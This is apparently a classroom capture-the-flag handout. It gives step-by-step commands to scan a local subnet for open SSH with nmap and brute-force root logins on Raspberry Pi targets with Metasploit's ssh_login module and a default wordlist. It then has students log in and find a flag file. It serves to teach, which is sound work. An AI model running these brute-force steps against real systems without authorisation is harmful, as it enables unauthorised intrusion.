# Capture The Flag With Metasploit

## The Targets

Find raspberry pi's running on the network with port 22 (SSH) open:

```
nmap -p 22 --open 192.168.1.0/24
```

## The Brute Force Password Attack

We will use a brute force password attack against the targets we found in the previous step.

### Password List
We will use a list of passwords which our attack will use and will try to login as the user *root* on each target.
To view our list of passwords run the following command:

```
cat /usr/share/metasploit-framework/data/wordlists/root_userpass.txt
```

### Start Metasploit

Let's launch the metasploit command shell from which we will run our exploit from:

```
msfconsole
```

### Load The SSH Login Attack

Metasploit comes with hundreds of exploits that you can run against targets. In this exercise we will use the "ssh_login" exploit which will try to login with a username and password from our list above.

Run the following command to load the "ssh_login" exploit:

```
use auxiliary/scanner/ssh/ssh_login
```

### Configuring The Attack

We need to configure our ssh_login attack with a few settings...

Set the target ip address range that we will attack with:

```
set RHOSTS 192.168.1.1-10
```

Set the path to the username and password list with:

```
set USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/root_userpass.txt
```

Set the number of attacks that can run at one time so we can efficiently run the attack against our targets with:

```
set THREADS 10
```

### View Options

To make sure the settings are applied from the previous three steps we will run the following command:

```
show options
```

### Running The Attack

Start the ssh_login attack with the following command:

```
run
```

After the attack completes you will see "success" on a line that has a username and password that was used to successfuly login. You'll use this ip address, username and password later below.

Now exit the metasploit shell:
```
exit -y
```

If you're successful you will see the output above. Now grab this ip address and login with it via ssh using the password matched:

```
ssh root@the ip address here
```

## Find The Flag

There is a file named "cyber2019flag.txt" somewhere on the file system. 

Use the find command to locate this file on the file system and then grap the secret code inside and be the first to write it on the dry erase board up front!

Hint:

```
find / -name "some filename here"
```
